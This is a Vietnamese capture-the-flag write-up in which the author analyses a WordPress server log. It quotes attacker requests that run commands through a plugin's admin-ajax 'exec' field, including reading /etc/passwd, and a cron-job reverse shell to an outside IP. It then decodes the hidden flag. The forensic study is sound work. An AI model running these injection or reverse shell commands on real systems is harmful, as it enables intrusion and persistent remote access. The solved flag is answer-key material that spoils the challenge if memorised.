# VSL Summer CTF

<img src="https://github.com/Thuanle2401/VSL-CTF/blob/main/web/UploadFile1/images/VSL-summer.png?raw=true" width="500" height="300">

---
# Challenge: log log log
---
## 1. Thông tin người thực hiện
- Họ và tên: Lê Ngọc Thuận

## 2. Solution
### Bước 1: Phân tích hành vi bất thường
- Duyệt qua file log, tôi phát hiện một số IP đáng ngờ, đặc biệt là 82.179.92.206, liên tục gửi các truy vấn lạ tới endpoint:

```bash
/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:...
```

- Chức năng exec cho phép thực thi lệnh hệ thống — một dấu hiệu cực kỳ nguy hiểm!
- Ví dụ lệnh:

```h
...&field=field:exec:id:NULL:NULL
...&field=field:exec:cat /etc/passwd:NULL:NULL
```

- Attacker đang thử các lệnh để thăm dò hệ thống.

### Bước 2: Payload Reverse Shell đáng chú ý
- Tại dòng 11477, có một dòng payload rất đặc biệt:

```bash
echo "sh -i > /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect
```
- Lệnh này tạo reverse shell, gửi kết nối ngược về attacker thông qua một cron job, rất xảo quyệt.
- Nhưng thú vị hơn cả là phần sau của payload:

```bash
Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;
echo $Mz$Tz$Vz$az$Kz$Oz | base64 -d | rev
```

- Các biến này được ghép lại, base64 decode, rồi đảo ngược (rev). Như một dạng mini-obfuscation để che giấu dữ liệu.

### Bước 3: Giải mã payload

1. Ghép lại biến:

```bash
fXIzTm4xZ0ViXzRfdDV5bDRuQF9nMEx7QlRI
```

2. Base64 decode:

```bash
}r3Nn1gEb_4_t5yl4n@_g0L{BTH
```

3. Reverse:

```bash
HTB{L0g_@n4ly5t_4_bEg1nN3r}

>> Command: echo fXIzTm4xZ0ViXzRfdDV5bDRuQF9nMEx7QlRI | base64 -d | rev
